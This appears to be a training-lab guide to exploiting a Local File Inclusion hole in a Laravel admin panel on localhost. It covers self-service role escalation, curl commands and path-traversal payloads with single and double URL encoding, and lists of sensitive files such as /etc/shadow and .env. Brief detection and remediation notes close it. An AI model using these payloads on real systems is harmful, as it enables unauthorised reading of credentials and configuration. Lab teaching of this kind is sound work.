# LFI Exploitation Examples

This document provides examples of how to exploit the Local File Inclusion (LFI) vulnerability in the lab environment.

## Prerequisites

1. **Role Escalation**: First, you need to escalate your privileges by editing your user profile and changing your role to "Administrador" or "Programador".

2. **Access the System Menu**: Navigate to the admin panel and access the "Sistema" menu.

## Exploitation Methods

### Method 1: Web Interface
1. Go to `http://localhost:8000/admin/system/file`
2. Enter file paths in the input field:
   - `/etc/passwd` - User account information
   - `/etc/shadow` - Encrypted password information
   - `/var/log/apache2/access.log` - Apache access logs
   - `/proc/version` - Kernel version
   - `/etc/hosts` - Hostname resolution

### Method 2: Direct API Access
Use the JSON endpoint for programmatic access:

```bash
# Read /etc/passwd
curl "http://localhost:8000/admin/system/log?file=/etc/passwd"

# Read Apache logs
curl "http://localhost:8000/admin/system/log?file=/var/log/apache2/access.log"

# Read system information
curl "http://localhost:8000/admin/system/log?file=/proc/version"
```

### Method 3: Path Traversal
Try different path traversal techniques:

```bash
# Standard path
http://localhost:8000/admin/system/file?file=/etc/passwd

# With encoding
http://localhost:8000/admin/system/file?file=..%2F..%2F..%2Fetc%2Fpasswd

# Double encoding
http://localhost:8000/admin/system/file?file=..%252F..%252F..%252Fetc%252Fpasswd
```

## Common Files to Read

### System Files
- `/etc/passwd` - User accounts
- `/etc/shadow` - Password hashes
- `/etc/hosts` - Hostname mapping
- `/etc/issue` - System banner
- `/proc/version` - Kernel version
- `/proc/cpuinfo` - CPU information

### Log Files
- `/var/log/apache2/access.log` - Apache access logs
- `/var/log/apache2/error.log` - Apache error logs
- `/var/log/nginx/access.log` - Nginx access logs
- `/var/log/nginx/error.log` - Nginx error logs
- `/var/log/auth.log` - Authentication logs

### Application Files
- `/var/www/html/.env` - Environment variables
- `/var/www/html/storage/logs/laravel.log` - Laravel logs
- `/var/www/html/config/database.php` - Database configuration

## Detection in Logs

The LFI attempts will be visible in:
- Laravel logs: `storage/logs/laravel.log`
- Web server logs: `/var/log/apache2/access.log` or `/var/log/nginx/access.log`
- Application logs: Check the admin panel for access attempts

## Security Implications

This vulnerability allows attackers to:
1. Read sensitive system files
2. Extract user credentials
3. Gather system information
4. Access application configuration
5. Read log files for reconnaissance

## Remediation (Not for Lab)

In a real environment, this should be fixed by:
1. Implementing proper input validation
2. Using allowlists for file paths
3. Restricting file access to specific directories
4. Implementing proper access controls
5. Using file inclusion functions safely 